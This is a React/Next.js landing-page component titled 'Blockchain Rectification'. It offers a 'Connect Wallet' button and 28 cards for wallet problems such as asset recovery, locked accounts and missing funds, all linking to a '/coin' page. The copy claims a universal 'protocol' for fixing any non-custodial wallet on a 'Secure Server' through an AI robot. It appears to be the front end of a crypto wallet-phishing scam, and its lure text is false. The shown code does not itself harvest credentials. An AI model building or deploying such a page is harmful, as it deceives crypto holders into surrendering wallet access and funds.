import React, { useState } from 'react';
import { BsCheck2Circle } from 'react-icons/bs';
import {
  FaBoxTissue,
  FaDelicious,
  FaWallet,
  FaWarehouse,
} from 'react-icons/fa';
import { MdGasMeter, MdToken } from 'react-icons/md';
import { GrDocumentTransfer, GrTransaction } from 'react-icons/gr';
import { SiAcclaim } from 'react-icons/si';
import { LuLogIn } from 'react-icons/lu';
import { GiWhiteTower } from 'react-icons/gi';
import Link from 'next/link';
import axios from 'axios';
import { cryptoData } from './data';
import Image from 'next/image';
function Main() {
  console.log(cryptoData);

  return (
    <div className='flex flex-col text-white'>
      <div className='absolute right-0 top-20'>
        <Image src={'/hero.png'} width={800} height={800} alt='image'/>
      </div>
      <div className='p-5 md:p-10 space-y-5 font-bold z-30 md:w-[50%]'>
        <h1 className='text-[60px]'>Blockchain</h1>
        <h1 className='text-[60px]'>Rectification</h1>
        <p className='text-lg font-bold'>
          Every digital artwork on Upside is authentic and truly unique.
          Blockchain technology makes this new aproch to digital ownership
          possible. <br></br>
          <br></br>Open and decentralized protocol for syncing various Wallets
          issues on Secure Server. This is not an app but a protocol that
          establishes a remote resolution between all noncustodial wallet{' '}
          <br></br>
          <br></br>It is an online server which gets you across to every wallet
          representative to enable effective complain and rectification of
          issues.
          <br></br>
          <br></br>You will be on a chat with an Artificial Intelligence Robot
          with zero Human interference.
        </p>
        <div className='flex flex-col md:flex-row mt-8 md:items-center md:space-x-4 space-y-4 md:space-y-0'>
          <button className='bg-blue-500 px-8 py-4 rounded-md cursor-pointer hover:bg-[#15243B] transition-all ease-in-out duration-500'>
            Connect Wallet
          </button>
          <select className='bg-transparent px-8 py-4 rounded-md border-2 border-blue-500 cursor-pointer hover:bg-[#15243B] transition-all ease-in-out duration-500'>
            {cryptoData?.map((name) => (
              <option key={name.name} value={name.name}>
                {name.name}
              </option>
            ))}
          </select>
        </div>
      </div>
      <div className='section bg-[#091930] py-12 px-5 md:px-10'>
        <h1 className='text-3xl font-bold mb-6'>Make Your Selection Below</h1>
        <div className='grid md:grid-cols-2 lg:grid-cols-3 gap-5'>
          {homedata.map((e) => {
            const { id, title, text, icon } = e;
            return (
              <div key={id} className='bg-[#15243B] shadow-md px-4 py-10 rounded-md space-y-10 cursor-pointer hover:bg-[#001132] transition-all ease-in-out duration-500'>
                <Link href={'/coin'}>
                  <div className='font-bolder text-[50px] text-blue-500'>
                    {icon}
                  </div>
                  <h1 className='text-3xl font-bold tracking-wider my-6'>
                    {title}
                  </h1>
                  <h1>{text}</h1>
                </Link>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}

export default Main;

const homedata = [
  {
    id: 1,
    icon: <BsCheck2Circle />,
    title: 'Validation',
    text: 'Click here to buy Tokens',
  },
  {
    id: 2,
    icon: <BsCheck2Circle />,
    title: 'Buy',
    text: 'Click here to buy Tokens',
  },
  {
    id: 3,
    icon: <BsCheck2Circle />,
    title: 'Sell',
    text: 'Click here to sell Tokens',
  },
  {
    id: 4,
    icon: <BsCheck2Circle />,
    title: 'Mint',
    text: 'Click here to mint Tokens',
  },
  {
    id: 5,
    icon: <BsCheck2Circle />,
    title: 'NFT',
    text: 'Click here for NFTs',
  },
  {
    id: 6,
    icon: <BsCheck2Circle />,
    title: 'BRIDGE',
    text: 'Click here to bridge Tokens',
  },
  {
    id: 7,
    icon: <BsCheck2Circle />,
    title: 'MIGRATION',
    text: 'Click here for migration',
  },
  {
    id: 8,
    icon: <BsCheck2Circle />,
    title: 'STAKE/UNSTAKE',
    text: 'Click here to stake and unstake Tokens',
  },
  {
    id: 9,
    icon: <BsCheck2Circle />,
    title: 'MIGRATION ISSUES',
    text: 'Click here for migration related issues',
  },
  {
    id: 10,
    icon: <FaWarehouse />,
    title: 'ASSETS RECOVERY',
    text: 'Click here for assets recovery issues',
  },
  {
    id: 11,
    icon: <MdGasMeter />,
    title: 'HIGH GAS FEE',
    text: 'Click here for gas fee related issues',
  },
  {
    id: 12,
    icon: <MdGasMeter />,
    title: 'SLIPPAGE ERROR',
    text: 'Click here for slippage related error during trade',
  },
  {
    id: 13,
    icon: <GrDocumentTransfer />,
    title: 'TRANSACTION ERROR',
    text: 'Click here for transaction related issues',
  },
  {
    id: 14,
    icon: <GrTransaction />,
    title: 'CROSS CHAIN TRANSFER',
    text: 'Click here for cross chain bridge issues',
  },
  {
    id: 15,
    icon: <FaWarehouse />,
    title: 'STAKING ISSUES',
    text: 'Click here for staking related issues',
  },
  {
    id: 16,
    icon: <SiAcclaim />,
    title: 'SWAP/EXCHANGE',
    text: 'Click here for swap/exchange related issues',
  },
  {
    id: 17,
    icon: <SiAcclaim />,
    title: 'CLAIM REFLECTION',
    text: 'Click here to claim reflection',
  },
  {
    id: 18,
    icon: <FaDelicious />,
    title: 'CONNECT TO DAPPS',
    text: 'Click here for error while connecting to Dapps',
  },
  {
    id: 19,
    icon: <LuLogIn />,
    title: 'LOGIN ISSUES',
    text: 'Click here for issues while logging into your wallet',
  },
  {
    id: 20,
    icon: <GiWhiteTower />,
    title: 'CLAIM AIRDROP',
    text: 'Click here for airdrop related issues',
  },
  {
    id: 21,
    icon: <MdGasMeter />,
    title: 'NFTs ISSUES',
    text: 'Click here for NFTs minting/transfer related issues',
  },
  {
    id: 22,
    icon: <MdGasMeter />,
    title: 'MISSING/IRREGULAR BALANCE',
    text: 'Click here to recover lost/missing funds',
  },
  {
    id: 23,
    icon: <GiWhiteTower />,
    title: 'WHITELIST ISSUES',
    text: 'Click here for whitelist related issues',
  },
  {
    id: 24,
    icon: <FaDelicious />,
    title: 'TRANSACTION DELAY',
    text: 'Click here for any issues related to transaction delayed',
  },
  {
    id: 25,
    icon: <FaDelicious />,
    title: 'LOCKED ACCOUNT',
    text: 'Click here for issues related to account lock',
  },
  {
    id: 26,
    icon: <FaWallet />,
    title: 'TRADING WALLET ISSUES',
    text: 'Click here if you have a problem with your trading wallet',
  },
  {
    id: 27,
    icon: <MdToken />,
    title: 'UNABLE TO BUY COINS/TOKENS',
    text: 'To trade crypto, your account must be marked as a trusted payment source',
  },
  {
    id: 28,
    icon: <FaBoxTissue />,
    title: 'OTHER ISSUES NOT LISTED',
    text: "If you can't find the issues you are experiencing, click here",
  },
];
